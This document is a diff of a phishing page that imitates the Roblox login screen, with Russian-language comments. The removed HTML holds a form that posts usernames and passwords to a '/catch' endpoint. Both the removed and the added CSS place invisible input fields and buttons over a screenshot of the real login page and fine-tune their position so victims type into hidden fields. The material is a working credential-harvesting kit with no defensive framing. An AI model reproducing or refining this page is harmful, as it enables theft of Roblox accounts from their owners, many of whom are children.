@@ -1,125 +1,94 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Roblox</title>
-    <style>
-        body {
-            background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
+body {
+    background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    
+    color: #ffffff;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    overflow: hidden;
+}
 
-        .auth-container {
-            background: transparent;
-            width: 100%;
-            max-width: 410px;
-            padding: 20px;
-            margin-top: 45px; /* Сдвиг вниз ровно на уровень полей картинки */
-            box-sizing: border-box;
-        }
+.auth-container {
+    background: transparent;
+    width: 100%;
+    max-width: 390px;
+    padding: 0;
+    
+    /* Точная подгонка координат */
+    margin-top: -25px; /* Поднимаем форму выше */
+    margin-left: 20px; /* Сдвигаем правее */
+    
+    box-sizing: border-box;
+}
 
-        /* Полностью скрываем видимый текст HTML */
-        h1, 
-        .link-text, 
-        .signup-text {
-            display: none;
-        }
+h1, 
+.link-text, 
+.signup-text {
+    display: none;
+}
 
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
+form {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
 
-        /* Невидимые поля ввода поверх картинки */
-        .input-control {
-            width: 100%;
-            height: 42px;
-            background: transparent;
-            border: none;
-            outline: none;
-            color: #ffffff;
-            font-size: 15px;
-            padding: 0 12px;
-            box-sizing: border-box;
-            /* Сделай 0.2 вместо 0, если захочешь увидеть где поля во время подгонки */
-            opacity: 0; 
-        }
+.input-control {
+    width: 100%;
+    height: 44px;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: #ffffff;
+    font-size: 15px;
+    padding: 0 14px;
+    box-sizing: border-box;
+    opacity: 0; 
+}
 
-        .input-control:focus {
-            opacity: 1; /* При клике мышкой поле станет видимым, чтобы было удобно вводить */
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 4px;
-        }
+/* Скрываем плейсхолдер, чтобы текст не двоился с фоновым рисунком */
+.input-control::placeholder {
+    color: transparent;
+}
 
-        /* Невидимая кнопка Log In */
-        .btn-submit {
-            width: 100%;
-            height: 42px;
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            margin-top: 8px;
-            opacity: 0;
-        }
+.input-control:focus {
+    opacity: 1;
+    background: rgba(0, 0, 0, 0.6);
+    border-radius: 4px;
+}
 
-        .secondary-actions {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 60px; /* Отступ до нижних кнопок */
-        }
+.btn-submit {
+    width: 100%;
+    height: 42px;
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    margin-top: 10px;
+    opacity: 0;
+}
 
-        /* Невидимые дополнительные кнопки */
-        .btn-secondary {
-            width: 100%;
-            height: 38px;
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            opacity: 0;
-        }
+.secondary-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-top: 55px;
+}
 
-        .error-message {
-            display: none;
-        }
-    </style>
-</head>
-<body>
+.btn-secondary {
+    width: 100%;
+    height: 38px;
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    opacity: 0;
+}
 
-    <div class="auth-container">
-        <h1>Login to Roblox</h1>
-        
-        <form action="/catch" method="POST">
-            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
-            <input type="password" name="password" class="input-control" placeholder="Password" required>
-            <div class="error-message">Incorrect username or password.</div>
-            <button type="submit" class="btn-submit">Log In</button>
-        </form>
-
-        <a href="#" class="link-text">Forgot Password or Username?</a>
-        
-        <div class="secondary-actions">
-            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
-            <button type="button" class="btn-secondary">Quick Sign-In</button>
-        </div>
-        
-        <div class="signup-text">
-            Don't have an account? <a href="#">Sign Up</a>
-        </div>
-    </div>
-
-</body>
-</html>
+.error-message {
+    display: none;
+}
